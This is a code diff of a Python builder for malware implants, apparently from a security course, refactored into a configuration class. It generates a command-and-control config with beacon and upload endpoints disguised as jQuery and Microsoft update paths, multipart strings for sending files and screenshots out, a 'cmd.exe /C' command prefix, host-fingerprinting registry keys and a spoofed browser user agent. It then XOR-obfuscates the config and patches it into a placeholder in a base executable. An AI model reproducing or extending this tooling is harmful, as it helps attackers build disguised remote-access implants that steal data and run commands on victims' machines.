@@ -10,56 +10,118 @@ Optional paramaters for input and output files
 Future plans: UI of some sort, encrypting the config file 
 """
 
+class configuration:
+    def __init__(self, version=1, verbose=False, buffer_length=2000):
+        self.buffer_length = buffer_length
 
-def xor_data(data, keys):
-    return bytearray(data[i] ^ keys[i % len(keys)] for i in range(0, len(data)) ) 
+        self.config = dict()
+        self.version = version
+        self.verbose = verbose
+
+        self.config["version"] = self.version
+        self.config["strings"] = dict()
+        self.config["endpoints"] = dict()
+
+        self.strings = self.config["strings"]
+        self.endpoints = self.config["endpoints"]
 
 
-def gen_config_dict():
-    #
-    # Returns a dictionary in the standard config format
-    # Changes made to the structure/format of the config JSON may require config.cpp/config.h to be updated as well 
-    #
+    def get_json_bytes(self):
+        # generate the configuration file as a string  
+        return json.dumps(self.config).encode()
 
-    config = dict()
-    config["version"] = 0
 
-    # endpoints
-    config["endpoints"] = dict()
-    config["endpoints"]["heartbeat"] = "/docroot/js/jquery-ui-1.11.2.custom.min.js"
-    config["endpoints"]["info"] = "/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab"
-    config["endpoints"]["out"] = "/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab"
-    config["endpoints"]["upload"] = "/msdownload/update/v3/static/untrustedr/en/authroot.cab"
-    config["endpoints"]["ps"] = "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"
+    def xor_data(self, data, keys):
+        return bytearray(data[i] ^ keys[i % len(keys)] for i in range(0, len(data))) 
 
-    # strings 
-    config["strings"] = dict()
-    config["strings"]["post"] = "POST"
-    config["strings"]["get"] = "GET"
-    config["strings"]["uploadheaders"] = "Content-Type: multipart/form-data; boundary=UPLOAD"
-    config["strings"]["uploadheadfile"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n"
-    config["strings"]["uploadheadscreenshot"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n"
-    config["strings"]["uploadtail"] = "\r\n--UPLOAD--\r\n"
-    config["strings"]["cmd"] = "cmd.exe /C "
-    config["strings"]["regsubkey"] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
-    config["strings"]["productname"] = "ProductName"
-    config["strings"]["displayversion"] = "DisplayVersion"
 
-    # net
-    config["hostname"] = "127.0.0.1"
-    config["port"] = 5000
-    config["protocol"] = "http"
-    config["useragent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36"
-    config["ipcheckurl"] = "http://ifconfig.me/ip"
+    def get_encrypted_bytes(self, num_keys=4):
+        config_bytes = self.get_json_bytes()
+        # generate the 4 bytes for multibyte XOR key
+        self.keys = [random.randrange(1,255) for i in range(num_keys)]
+        keybytes = [key.to_bytes(1, 'big') for key in self.keys]
+        padding = b"\x00" * (self.buffer_length - len(config_bytes) - len(keybytes))
 
-    # times
-    config["sleeptime"] = 1 * 1000
-    config["cmdtimeout"] = 5 * 10000000
+        if(self.verbose):
+            print(config_bytes)
+            print(self.keys)
 
-    # keys
-    config["key"] = "CSEC476"
-    config["xorkey"] = 0x7f
-    return config
+        # create bytearray of key bytes
+        keybytesout = b''
+        for keybyte in keybytes:
+            keybytesout += keybyte
+        
+        # create and return the final config byte array in format: keybytes, XORd data, padding
+        config_bytes = keybytesout + self.xor_data(config_bytes + padding, self.keys)
+        if(self.verbose):
+            print(config_bytes)
+        return config_bytes
+    
+    
+    def assign_default_values(self):
+        #
+        # Assigns the default values to the config
+        # TODO: Make this more modular
+        # Changes made to the structure/format of the config JSON may require config.cpp/config.h to be updated as well 
+        #
+
+        # endpoints
+        self.endpoints["heartbeat"] = "/docroot/js/jquery-ui-1.11.2.custom.min.js"
+        self.endpoints["info"] = "/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab"
+        self.endpoints["out"] = "/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab"
+        self.endpoints["upload"] = "/msdownload/update/v3/static/untrustedr/en/authroot.cab"
+        self.endpoints["ps"] = "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"
+
+        # strings 
+        self.strings["post"] = "POST"
+        self.strings["get"] = "GET"
+        self.strings["uploadheaders"] = "Content-Type: multipart/form-data; boundary=UPLOAD"
+        self.strings["uploadheadfile"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n"
+        self.strings["uploadheadscreenshot"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n"
+        self.strings["uploadtail"] = "\r\n--UPLOAD--\r\n"
+        self.strings["cmd"] = "cmd.exe /C "
+        self.strings["regsubkey"] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+        self.strings["productname"] = "ProductName"
+        self.strings["displayversion"] = "DisplayVersion"
+
+        # net
+        self.config["hostname"] = "127.0.0.1"
+        self.config["port"] = 5000
+        self.config["protocol"] = "http"
+        self.config["useragent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36"
+        self.config["ipcheckurl"] = "http://ifconfig.me/ip"
+
+        # times
+        self.config["sleeptime"] = 1 * 1000
+        self.config["cmdtimeout"] = 5 * 10000000
+
+        # keys
+        self.config["key"] = "CSEC476"
+        self.config["xorkey"] = 0x7f
+
+
+def gen_payload(config, infile, outfile, dry_run=False):
+    # Generate encrypted bytes
+    config_bytes = config.get_encrypted_bytes()
+
+    # Read executable into bytearray
+    with open(infile, 'rb') as exe:
+        baseexe = bytearray(exe.read())
+    exe.close()
+
+    # Find offset
+    offset = baseexe.find(b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+    if config.verbose:
+        print(offset)
+
+    # Copy executable into new file + write config_bytes @ offset
+    if not dry_run:
+        with open(outfile, 'wb') as exe:
+            exe.write(baseexe)
+            exe.seek(offset)
+            exe.write(config_bytes)
+            print("Config written to " + outfile)
+        exe.close()
 
 
 def main():
@@ -68,43 +130,19 @@ def main():
     parser = argparse.ArgumentParser(description="Basic builder utility for implants as seen at https://www.youtube.com/watch?v=FiT7-zxQGbo")
     parser.add_argument('--i', type=str, default='base.exe', help="Input file")
     parser.add_argument('--o', type=str, default='out.exe', help="Output file")
+    parser.add_argument('--v', default=False, action='store_true', help="Verbose output")
+    parser.add_argument('--dry-run', default=False, action='store_true', help="Dry run (don't write output file)")
+
     args = parser.parse_args()
+    infile = args.i
+    outfile = args.o
+    verbose = args.v
+    dry_run = args.dry_run
 
-    # generate the configuration file as a string  
-    config = gen_config_dict()
-    config = json.dumps(config).encode()
-    print(config)
-
-    # generate the 4 bytes for multibyte XOR key
-    keys = [random.randrange(1,255) for i in range(4)]
-    keybytes = [key.to_bytes(1, 'big') for key in keys]
-    padding = b"\x00" * (BUFLEN - len(config) - len(keybytes))
+    config = configuration(version=1, verbose=verbose, buffer_length=BUFLEN)
+    config.assign_default_values()
+    gen_payload(config, infile, outfile, dry_run=dry_run)
     
-    keybytesout = b''
-    for keybyte in keybytes:
-        keybytesout += keybyte
-    config = keybytesout + xor_data(config + padding, keys)
-
-    print(keybytes)
-    print(config)
-    print(len(config))
-    
-    # Read executable into bytearray
-    with open(args.i, 'rb') as exe:
-        baseexe = bytearray(exe.read())
-    exe.close()
-    
-    # Find offset
-    offset = baseexe.find(b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
-    print(offset)
-
-    # Copy executable into new file + write config @ offset
-    with open(args.o, 'wb') as exe:
-        exe.write(baseexe)
-        exe.seek(offset)
-        exe.write(config)
-    exe.close()
-
 
 if __name__ == "__main__":
     main()
